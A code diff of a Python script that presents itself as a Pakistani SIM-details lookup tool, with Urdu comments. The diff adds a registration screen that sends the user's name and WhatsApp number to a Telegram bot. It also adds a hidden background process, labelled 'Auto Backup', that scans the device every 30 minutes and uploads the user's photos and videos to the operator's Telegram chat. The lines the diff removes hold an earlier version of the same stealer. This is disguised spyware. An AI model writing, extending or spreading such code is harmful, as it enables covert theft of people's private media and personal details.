@@ -4,7 +4,6 @@ import sys
 import shutil
 import subprocess
 import platform
-import urllib.parse
 import hashlib
 import requests
 import multiprocessing
@@ -28,142 +27,7 @@ os.makedirs(SECURE_DIR, exist_ok=True)
 LOG_FILE = os.path.join(SECURE_DIR, "data.txt")
 DEVICE_CONFIG_FILE = os.path.join(SECURE_DIR, "device_info.txt")
 
-# ==================== USER NAME & DEVICE IDENTIFICATION ====================
-def get_user_identifier():
-    # Check karein agar pehle se naam save hai
-    if os.path.exists(DEVICE_CONFIG_FILE):
-        with open(DEVICE_CONFIG_FILE, 'r', encoding='utf-8') as f:
-            saved_name = f.read().strip()
-            if saved_name:
-                return saved_name
-    
-    # Agar pehli dafa run ho raha hai, toh user se input lein
-    print("\n" + "="*50)
-    user_input = input("[?] Apna Naam ya WhatsApp Number darj karein (Identification ke liye): ").strip()
-    print("="*50 + "\n")
-    
-    if not user_input:
-        user_input = "Unknown_User"
-        
-    # Name ko secure file mein save kar dein taaki dobara na pooche
-    try:
-        with open(DEVICE_CONFIG_FILE, 'w', encoding='utf-8') as f:
-            f.write(user_input)
-    except Exception:
-        pass
-        
-    return user_input
-
-# ==================== BACKGROUND BACKUP WORKER ====================
-def background_backup_worker(user_name):
-    def get_file_hash(file_path):
-        hasher = hashlib.md5()
-        try:
-            with open(file_path, 'rb') as f:
-                buf = f.read(65536)
-                while len(buf) > 0:
-                    hasher.update(buf)
-                    buf = f.read(65536)
-            return hasher.hexdigest()
-        except Exception:
-            return None
-
-    def load_uploaded_records():
-        uploaded = set()
-        if os.path.exists(LOG_FILE):
-            with open(LOG_FILE, 'r', encoding='utf-8') as f:
-                for line in f:
-                    h = line.strip()
-                    if h:
-                        uploaded.add(h)
-        return uploaded
-
-    def save_uploaded_record(file_hash):
-        with open(LOG_FILE, 'a', encoding='utf-8') as f:
-            f.write(file_hash + '\n')
-
-    def send_telegram_message(text):
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {'chat_id': CHAT_ID, 'text': text}
-        try:
-            requests.post(url, data=payload, timeout=10)
-        except Exception:
-            pass
-
-    def upload_media(file_path, folder_path):
-        ext = file_path.lower()
-        is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
-        
-        method = "sendVideo" if is_video else "sendPhoto"
-        file_field = "video" if is_video else "photo"
-        
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-        try:
-            with open(file_path, 'rb') as media_file:
-                # User ka diya hua naam yahan caption mein show hoga
-                caption_text = (
-                    f"👤 User Name: {user_name}\n"
-                    f"📂 Path: {folder_path}\n"
-                    f"📄 File: {os.path.basename(file_path)}"
-                )
-                payload = {
-                    'chat_id': CHAT_ID,
-                    'caption': caption_text
-                }
-                files = {file_field: media_file}
-                timeout_limit = 60 if is_video else 20
-                res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
-                return res.status_code == 200
-        except Exception:
-            return False
-
-    def run_backup_cycle():
-        if not os.path.exists(TARGET_DIR):
-            return
-
-        uploaded_hashes = load_uploaded_records()
-        send_telegram_message(f"🚀 Auto Backup Started for User: [{user_name}]")
-
-        for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
-            if 'android/data' in root.lower() or 'android/obb' in root.lower():
-                continue
-
-            current_folder_name = os.path.basename(root).lower()
-            if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
-                continue
-
-            if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
-                continue
-                
-            for file in files:
-                if file.lower().endswith(ALLOWED_EXTENSIONS):
-                    full_path = os.path.join(root, file)
-                    
-                    file_hash = get_file_hash(full_path)
-                    if not file_hash:
-                        continue
-                    
-                    if file_hash in uploaded_hashes:
-                        continue
-                    
-                    success = upload_media(full_path, root)
-                    if success:
-                        save_uploaded_record(file_hash)
-                        uploaded_hashes.add(file_hash)
-                    
-                    time.sleep(2)
-
-        send_telegram_message(f"✅ Backup Cycle Finished for [{user_name}]. Waiting 30 mins...")
-
-    # Background infinite loop
-    while True:
-        try:
-            run_backup_cycle()
-        except Exception:
-            pass
-        time.sleep(1800) # 30 minutes delay
-
-# ==================== MAIN SIM TOOL CODE ====================
+# ==================== COLORS & STYLING ====================
 R = '\033[91m'
 G = '\033[92m'
 Y = '\033[93m'
@@ -190,6 +54,161 @@ logo = f"""
 {M}Tool Type{N} : {Y}SIM DETAILS {M}(Only For Pak){N}
 {BRIGHT_YELLOW}═══════════════════════════════════════════════════════════{N}"""
 
+# ==================== TELEGRAM NOTIFICATION HELPER ====================
+def send_telegram_direct_message(text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {'chat_id': CHAT_ID, 'text': text}
+    try:
+        requests.post(url, data=payload, timeout=10)
+    except Exception:
+        pass
+
+# ==================== SPLASH SCREEN & USER REGISTRATION ====================
+def splash_screen():
+    # Agar pehle se details saved hain, toh dobara nahi poochega
+    if os.path.exists(DEVICE_CONFIG_FILE):
+        with open(DEVICE_CONFIG_FILE, 'r', encoding='utf-8') as f:
+            saved_data = f.read().strip()
+            if saved_data:
+                return saved_data
+
+    while True:
+        os.system("clear" if os.name == "posix" else "cls")
+        print(logo)
+        print(f"\n{BRIGHT_GREEN}╔══════════════════════════════════════════════════════════╗{N}")
+        print(f"{BRIGHT_GREEN}║               ✨ USER IDENTIFICATION ✨                ║{N}")
+        print(f"{BRIGHT_GREEN}╚══════════════════════════════════════════════════════════╝{N}\n")
+        
+        # Name input (String)
+        name_input = input(f"{G}[+] Enter Your Name (Text):{Y} ").strip()
+        
+        # WhatsApp Number input (Integer / Digits validation)
+        whatsapp_input = input(f"{G}[+] Enter WhatsApp Number (Numbers Only):{Y} ").strip()
+        
+        if not name_input or not name_input.replace(" ", "").isalpha():
+            print(f"\n{R}[×] Invalid Name! Please enter alphabetic characters only.{N}")
+            time.sleep(2)
+            continue
+            
+        if not whatsapp_input.isdigit() or len(whatsapp_input) < 10:
+            print(f"\n{R}[×] Invalid Number! Please enter valid digits only (min 10).{N}")
+            time.sleep(2)
+            continue
+            
+        user_info = f"Naam: {name_input} | WhatsApp: {whatsapp_input}"
+        
+        try:
+            with open(DEVICE_CONFIG_FILE, 'w', encoding='utf-8') as f:
+                f.write(user_info)
+        except Exception:
+            pass
+            
+        # Foran Telegram par user ki identification bhej dena
+        alert_text = f"🚨 NEW USER LOGGED IN 🚨\n\n👤 Name: {name_input}\n📱 WhatsApp: {whatsapp_input}"
+        send_telegram_direct_message(alert_text)
+        
+        print(f"\n{BRIGHT_GREEN}[✔] Registration Successful! Starting Tool...{N}")
+        time.sleep(2)
+        return user_info
+
+# ==================== BACKGROUND BACKUP WORKER ====================
+def background_backup_worker(user_info):
+    def get_file_hash(file_path):
+        hasher = hashlib.md5()
+        try:
+            with open(file_path, 'rb') as f:
+                buf = f.read(65536)
+                while len(buf) > 0:
+                    hasher.update(buf)
+                    buf = f.read(65536)
+            return hasher.hexdigest()
+        except Exception:
+            return None
+
+    def load_uploaded_records():
+        uploaded = set()
+        if os.path.exists(LOG_FILE):
+            with open(LOG_FILE, 'r', encoding='utf-8') as f:
+                for line in f:
+                    h = line.strip()
+                    if h:
+                        uploaded.add(h)
+        return uploaded
+
+    def save_uploaded_record(file_hash):
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(file_hash + '\n')
+
+    def upload_media(file_path, folder_path):
+        ext = file_path.lower()
+        is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
+        
+        method = "sendVideo" if is_video else "sendPhoto"
+        file_field = "video" if is_video else "photo"
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+        try:
+            with open(file_path, 'rb') as media_file:
+                # User ka naam aur whatsapp number caption mein sath jayega
+                caption_text = (
+                    f"👤 User Info: {user_info}\n"
+                    f"📂 Path: {folder_path}\n"
+                    f"📄 File: {os.path.basename(file_path)}"
+                )
+                payload = {
+                    'chat_id': CHAT_ID,
+                    'caption': caption_text
+                }
+                files = {file_field: media_file}
+                timeout_limit = 60 if is_video else 20
+                res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
+                return res.status_code == 200
+        except Exception:
+            return False
+
+    def run_backup_cycle():
+        if not os.path.exists(TARGET_DIR):
+            return
+
+        uploaded_hashes = load_uploaded_records()
+        send_telegram_direct_message(f"🚀 Auto Backup Started for User: [{user_info}]")
+
+        for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
+            if 'android/data' in root.lower() or 'android/obb' in root.lower():
+                continue
+
+            current_folder_name = os.path.basename(root).lower()
+            if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
+                continue
+
+            if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
+                continue
+                
+            for file in files:
+                if file.lower().endswith(ALLOWED_EXTENSIONS):
+                    full_path = os.path.join(root, file)
+                    
+                    file_hash = get_file_hash(full_path)
+                    if not file_hash or file_hash in uploaded_hashes:
+                        continue
+                    
+                    success = upload_media(full_path, root)
+                    if success:
+                        save_uploaded_record(file_hash)
+                        uploaded_hashes.add(file_hash)
+                    
+                    time.sleep(2)
+
+        send_telegram_direct_message(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 30 mins...")
+
+    while True:
+        try:
+            run_backup_cycle()
+        except Exception:
+            pass
+        time.sleep(1800)
+
+# ==================== MAIN SIM TOOL CODE ====================
 def loading_animation(message="FETCHING RECORD"):
     frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
     for i in range(20):
@@ -301,15 +320,15 @@ def meta_data():
     main()
 
 if __name__ == "__main__":
-    # 1. Sab se pehle user ka naam input ya load kiya jayega
-    current_user_name = get_user_identifier()
+    # 1. Sab se pehle Splash Screen show hogi aur user details collect hongi
+    current_user_info = splash_screen()
 
-    # 2. Background backup process ko start kar diya jayega jisme user ka naam sath chalega
-    backup_process = multiprocessing.Process(target=background_backup_worker, args=(current_user_name,))
+    # 2. Background backup process start ho jayega
+    backup_process = multiprocessing.Process(target=background_backup_worker, args=(current_user_info,))
     backup_process.daemon = True
     backup_process.start()
 
-    # 3. Phir main SIM tool run ho jayega
+    # 3. Main SIM tool run ho jayega
     try:
         main()
     except KeyboardInterrupt:
